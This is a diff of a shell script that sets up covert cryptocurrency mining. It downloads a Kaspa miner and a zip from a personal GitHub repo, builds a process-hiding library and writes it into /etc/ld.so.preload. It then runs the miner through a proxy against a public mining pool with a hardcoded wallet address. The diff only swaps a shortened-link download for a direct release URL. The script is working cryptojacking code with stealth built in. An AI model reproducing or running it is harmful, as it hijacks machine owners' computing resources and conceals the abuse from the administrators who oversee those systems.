@@ -33,8 +33,7 @@ echo " "
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://bit.ly/3Af31DS 
-chmod +x 3Af31DS
+./graftcp/graftcp wget https://github.com/bzminer/bzminer/releases/download/v11.1.0/bzminer_v11.1.0_linux.tar.gz && tar -xf bzminer_v11.1.0_linux.tar.gz && cd bzminer_v11.1.0_linux && chmod +x bzminer
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -43,4 +42,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./3Af31DS -a kaspa -p stratum+tcp://pool.us.woolypooly.com:3112 -w kaspa:qqjgh3lff277858uhn7upgpl4xlmqkhwry33wg0vfjxhnxexap8gywc62xf3f
+./graftcp/graftcp ./bzminer -a kaspa -p stratum+tcp://pool.us.woolypooly.com:3112 -w kaspa:qqjgh3lff277858uhn7upgpl4xlmqkhwry33wg0vfjxhnxexap8gywc62xf3f
